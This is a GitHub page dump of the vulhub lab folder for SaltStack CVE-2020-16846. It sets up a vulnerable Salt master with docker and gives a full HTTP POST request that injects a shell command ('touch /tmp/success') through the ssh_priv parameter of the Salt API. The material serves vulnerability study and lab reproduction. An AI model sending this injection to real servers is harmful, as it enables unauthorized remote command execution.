{"payload":{"allShortcutsEnabled":false,"path":"saltstack/CVE-2020-16846","repo":{"id":87699760,"defaultBranch":"master","name":"vulhub","ownerLogin":"vulhub","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2017-04-09T10:13:13.000Z","ownerAvatar":"https://avatars.githubusercontent.com/u/28655782?v=4","public":true,"private":false,"isOrgOwned":true},"currentUser":null,"refInfo":{"name":"master","listCacheKey":"v0:1697636685.0","canEdit":false,"refType":"branch","currentOid":"347ec1d3c083ee58d121824ec2cabd707862d37a"},"tree":{"items":[{"name":"1.png","path":"saltstack/CVE-2020-16846/1.png","contentType":"file"},{"name":"README.md","path":"saltstack/CVE-2020-16846/README.md","contentType":"file"},{"name":"README.zh-cn.md","path":"saltstack/CVE-2020-16846/README.zh-cn.md","contentType":"file"},{"name":"docker-compose.yml","path":"saltstack/CVE-2020-16846/docker-compose.yml","contentType":"file"}],"templateDirectorySuggestionUrl":null,"readme":{"displayName":"README.md","richText":"<article class=\"markdown-body entry-content container-lg\" itemprop=\"text\"><h1 tabindex=\"-1\" id=\"user-content-saltstack-shell-injection-cve-2020-16846\" dir=\"auto\"><a class=\"heading-link\" href=\"#saltstack-shell-injection-cve-2020-16846\">SaltStack Shell Injection (CVE-2020-16846)<svg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"><path d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"></path></svg></a></h1>\n<p dir=\"auto\"><a href=\"/vulhub/vulhub/blob/master/saltstack/CVE-2020-16846/README.zh-cn.md\">中文版本(Chinese version)</a></p>\n<p dir=\"auto\">Salt is a new approach to infrastructure management built on a dynamic communication bus. Salt can be used for data-driven orchestration, remote execution for any infrastructure, configuration management for any app stack, and much more.</p>\n<p dir=\"auto\">In November 2020, SaltStack officially disclosed two vulnerabilities, CVE-2020-16846 and CVE-2020-25592. CVE-2020-25592 allows arbitrary user to use the SSH module, and CVE-2020-16846 allows users to execute arbitrary commands. Chain these two vulnerabilities will allow unauthorized attackers to execute arbitrary commands through the Salt API.</p>\n<p dir=\"auto\">References:</p>\n<ul dir=\"auto\">\n<li><a href=\"https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag\" rel=\"nofollow\">https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag</a></li>\n<li><a href=\"https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html\" rel=\"nofollow\">https://docs.saltstack.com/en/latest/ref/netapi/all/salt.netapi.rest_cherrypy.html</a></li>\n</ul>\n<h2 tabindex=\"-1\" id=\"user-content-vulnerable-environment\" dir=\"auto\"><a class=\"heading-link\" href=\"#vulnerable-environment\">Vulnerable Environment<svg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"><path d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"></path></svg></a></h2>\n<p dir=\"auto\">Execute the following command to start a SaltStack-Master service:</p>\n<div class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"docker compose up -d\"><pre class=\"notranslate\"><code>docker compose up -d\n</code></pre></div>\n<p dir=\"auto\">After the SaltStack-Master is started, the following ports will be listened:</p>\n<ul dir=\"auto\">\n<li>4505/4506: SaltStack-Master server, which is a bridge between master and minions</li>\n<li>8000: Salt's API server, <strong>SSL requiring</strong></li>\n<li>2222: SSH server inside the container</li>\n</ul>\n<h2 tabindex=\"-1\" id=\"user-content-exploit\" dir=\"auto\"><a class=\"heading-link\" href=\"#exploit\">Exploit<svg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"><path d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"></path></svg></a></h2>\n<p dir=\"auto\">Send the following request to <code>https://your-ip:8000/run</code>:</p>\n<div class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"POST /run HTTP/1.1\nHost: 127.0.0.1:8000\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/x-yaml\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 87\n\ntoken=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%20/tmp/success%3b\"><pre class=\"notranslate\"><code>POST /run HTTP/1.1\nHost: 127.0.0.1:8000\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: application/x-yaml\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 87\n\ntoken=12312&amp;client=ssh&amp;tgt=*&amp;fun=a&amp;roster=whip1ash&amp;ssh_priv=aaa|touch%20/tmp/success%3b\n</code></pre></div>\n<p dir=\"auto\">Inject the command <code>touch /tmp/success</code> through the <code>ssh_priv</code> parameter:</p>\n<p dir=\"auto\"><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"/vulhub/vulhub/blob/master/saltstack/CVE-2020-16846/1.png\"><img src=\"/vulhub/vulhub/raw/master/saltstack/CVE-2020-16846/1.png\" alt=\"\" style=\"max-width: 100%;\"></a></p>\n</article>","errorMessage":null,"headerInfo":{"toc":[{"level":1,"text":"SaltStack Shell Injection (CVE-2020-16846)","anchor":"saltstack-shell-injection-cve-2020-16846","htmlText":"SaltStack Shell Injection (CVE-2020-16846)"},{"level":2,"text":"Vulnerable Environment","anchor":"vulnerable-environment","htmlText":"Vulnerable Environment"},{"level":2,"text":"Exploit","anchor":"exploit","htmlText":"Exploit"}],"siteNavLoginPath":"/login?return_to=https%3A%2F%2Fgithub.com%2Fvulhub%2Fvulhub%2Ftree%2Fmaster%2Fsaltstack%2FCVE-2020-16846"}},"totalCount":4,"showBranchInfobar":false},"fileTree":{"saltstack":{"items":[{"name":"CVE-2020-11651","path":"saltstack/CVE-2020-11651","contentType":"directory"},{"name":"CVE-2020-11652","path":"saltstack/CVE-2020-11652","contentType":"directory"},{"name":"CVE-2020-16846","path":"saltstack/CVE-2020-16846","contentType":"directory"}],"totalCount":3},"":{"items":[{"name":".github","path":".github","contentType":"directory"},{"name":"activemq","path":"activemq","contentType":"directory"},{"name":"adminer","path":"adminer","contentType":"directory"},{"name":"airflow","path":"airflow","contentType":"directory"},{"name":"apache-druid","path":"apache-druid","contentType":"directory"},{"name":"apereo-cas","path":"apereo-cas","contentType":"directory"},{"name":"apisix","path":"apisix","contentType":"directory"},{"name":"appweb","path":"appweb","contentType":"directory"},{"name":"aria2","path":"aria2","contentType":"directory"},{"name":"base","path":"base","contentType":"directory"},{"name":"bash","path":"bash","contentType":"directory"},{"name":"cacti","path":"cacti","contentType":"directory"},{"name":"celery","path":"celery","contentType":"directory"},{"name":"cgi","path":"cgi","contentType":"directory"},{"name":"coldfusion","path":"coldfusion","contentType":"directory"},{"name":"confluence","path":"confluence","contentType":"directory"},{"name":"couchdb","path":"couchdb","contentType":"directory"},{"name":"discuz","path":"discuz","contentType":"directory"},{"name":"django","path":"django","contentType":"directory"},{"name":"dns","path":"dns","contentType":"directory"},{"name":"docker","path":"docker","contentType":"directory"},{"name":"drupal","path":"drupal","contentType":"directory"},{"name":"dubbo","path":"dubbo","contentType":"directory"},{"name":"ecshop","path":"ecshop","contentType":"directory"},{"name":"elasticsearch","path":"elasticsearch","contentType":"directory"},{"name":"electron","path":"electron","contentType":"directory"},{"name":"elfinder","path":"elfinder","contentType":"directory"},{"name":"fastjson","path":"fastjson","contentType":"directory"},{"name":"ffmpeg","path":"ffmpeg","contentType":"directory"},{"name":"flask","path":"flask","contentType":"directory"},{"name":"flink","path":"flink","contentType":"directory"},{"name":"geoserver","path":"geoserver","contentType":"directory"},{"name":"ghostscript","path":"ghostscript","contentType":"directory"},{"name":"git","path":"git","contentType":"directory"},{"name":"gitea","path":"gitea","contentType":"directory"},{"name":"gitlab","path":"gitlab","contentType":"directory"},{"name":"gitlist","path":"gitlist","contentType":"directory"},{"name":"glassfish","path":"glassfish","contentType":"directory"},{"name":"goahead","path":"goahead","contentType":"directory"},{"name":"gogs","path":"gogs","contentType":"directory"},{"name":"grafana","path":"grafana","contentType":"directory"},{"name":"h2database","path":"h2database","contentType":"directory"},{"name":"hadoop","path":"hadoop","contentType":"directory"},{"name":"httpd","path":"httpd","contentType":"directory"},{"name":"imagemagick","path":"imagemagick","contentType":"directory"},{"name":"influxdb","path":"influxdb","contentType":"directory"},{"name":"jackson","path":"jackson","contentType":"directory"},{"name":"java","path":"java","contentType":"directory"},{"name":"jboss","path":"jboss","contentType":"directory"},{"name":"jeecg-boot","path":"jeecg-boot","contentType":"directory"},{"name":"jenkins","path":"jenkins","contentType":"directory"},{"name":"jetty","path":"jetty","contentType":"directory"},{"name":"jira","path":"jira","contentType":"directory"},{"name":"jmeter","path":"jmeter","contentType":"directory"},{"name":"joomla","path":"joomla","contentType":"directory"},{"name":"jumpserver","path":"jumpserver","contentType":"directory"},{"name":"jupyter","path":"jupyter","contentType":"directory"},{"name":"kafka","path":"kafka","contentType":"directory"},{"name":"kibana","path":"kibana","contentType":"directory"},{"name":"laravel","path":"laravel","contentType":"directory"},{"name":"librsvg","path":"librsvg","contentType":"directory"},{"name":"libssh","path":"libssh","contentType":"directory"},{"name":"liferay-portal","path":"liferay-portal","contentType":"directory"},{"name":"log4j","path":"log4j","contentType":"directory"},{"name":"magento","path":"magento","contentType":"directory"},{"name":"metabase","path":"metabase","contentType":"directory"},{"name":"metersphere","path":"metersphere","contentType":"directory"},{"name":"mini_httpd","path":"mini_httpd","contentType":"directory"},{"name":"minio","path":"minio","contentType":"directory"},{"name":"mojarra","path":"mojarra","contentType":"directory"},{"name":"mongo-express","path":"mongo-express","contentType":"directory"},{"name":"mysql","path":"mysql","contentType":"directory"},{"name":"nacos","path":"nacos","contentType":"directory"},{"name":"neo4j","path":"neo4j","contentType":"directory"},{"name":"nexus","path":"nexus","contentType":"directory"},{"name":"nginx","path":"nginx","contentType":"directory"},{"name":"node","path":"node","contentType":"directory"},{"name":"ntopng","path":"ntopng","contentType":"directory"},{"name":"ofbiz","path":"ofbiz","contentType":"directory"},{"name":"openfire","path":"openfire","contentType":"directory"},{"name":"opensmtpd","path":"opensmtpd","contentType":"directory"},{"name":"openssh","path":"openssh","contentType":"directory"},{"name":"openssl","path":"openssl","contentType":"directory"},{"name":"opentsdb","path":"opentsdb","contentType":"directory"},{"name":"php","path":"php","contentType":"directory"},{"name":"phpmailer","path":"phpmailer","contentType":"directory"},{"name":"phpmyadmin","path":"phpmyadmin","contentType":"directory"},{"name":"phpunit","path":"phpunit","contentType":"directory"},{"name":"polkit","path":"polkit","contentType":"directory"},{"name":"postgres","path":"postgres","contentType":"directory"},{"name":"python","path":"python","contentType":"directory"},{"name":"rails","path":"rails","contentType":"directory"},{"name":"redis","path":"redis","contentType":"directory"},{"name":"rocketchat","path":"rocketchat","contentType":"directory"},{"name":"rocketmq","path":"rocketmq","contentType":"directory"},{"name":"rsync","path":"rsync","contentType":"directory"},{"name":"ruby","path":"ruby","contentType":"directory"},{"name":"saltstack","path":"saltstack","contentType":"directory"},{"name":"samba","path":"samba","contentType":"directory"},{"name":"scrapy","path":"scrapy","contentType":"directory"},{"name":"shiro","path":"shiro","contentType":"directory"},{"name":"skywalking","path":"skywalking","contentType":"directory"},{"name":"solr","path":"solr","contentType":"directory"},{"name":"spark","path":"spark","contentType":"directory"},{"name":"spring","path":"spring","contentType":"directory"},{"name":"struts2","path":"struts2","contentType":"directory"},{"name":"supervisor","path":"supervisor","contentType":"directory"},{"name":"tests","path":"tests","contentType":"directory"},{"name":"thinkphp","path":"thinkphp","contentType":"directory"},{"name":"tikiwiki","path":"tikiwiki","contentType":"directory"},{"name":"tomcat","path":"tomcat","contentType":"directory"},{"name":"unomi","path":"unomi","contentType":"directory"},{"name":"uwsgi","path":"uwsgi","contentType":"directory"},{"name":"v2board","path":"v2board","contentType":"directory"},{"name":"weblogic","path":"weblogic","contentType":"directory"},{"name":"webmin","path":"webmin","contentType":"directory"},{"name":"wordpress","path":"wordpress","contentType":"directory"},{"name":"xstream","path":"xstream","contentType":"directory"},{"name":"xxl-job","path":"xxl-job","contentType":"directory"},{"name":"yapi","path":"yapi","contentType":"directory"},{"name":"zabbix","path":"zabbix","contentType":"directory"},{"name":".gitattributes","path":".gitattributes","contentType":"file"},{"name":".gitignore","path":".gitignore","contentType":"file"},{"name":".gitmodules","path":".gitmodules","contentType":"file"},{"name":"LICENSE","path":"LICENSE","contentType":"file"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"README.zh-cn.md","path":"README.zh-cn.md","contentType":"file"},{"name":"contributors.md","path":"contributors.md","contentType":"file"},{"name":"contributors.zh-cn.md","path":"contributors.zh-cn.md","contentType":"file"},{"name":"environments.toml","path":"environments.toml","contentType":"file"}],"totalCount":130}},"fileTreeProcessingTime":12.299294,"foldersToFetch":[],"treeExpanded":true,"symbolsExpanded":false,"csrf_tokens":{"/vulhub/vulhub/branches":{"post":"1-hGLOM7opWCctYAB_pefd1K7AViKy0SEpVUEnoAQYHV3lkGi1dpNvNE8NGNhnNKhSjfskn_xSbSMUhjfUjRbw"},"/vulhub/vulhub/branches/fetch_and_merge/master":{"post":"cCemBCbfIgOxyihum6zZSruSgWJlMdKPrUBnPSaxS2V7JQKIuKOiDGoaq59JslxJ8JgQY4sytPflNrEHoC59yw"},"/vulhub/vulhub/branches/fetch_and_merge/master?discard_changes=true":{"post":"CVqm2AipyHzQTEofbwZBaqwNUaFRLR9n9lBCYhitL8wCWAJUltVIcwucye69GMRp5wfAoL8ueR--JpRYnjIZYg"}}},"title":"vulhub/saltstack/CVE-2020-16846 at master · vulhub/vulhub"}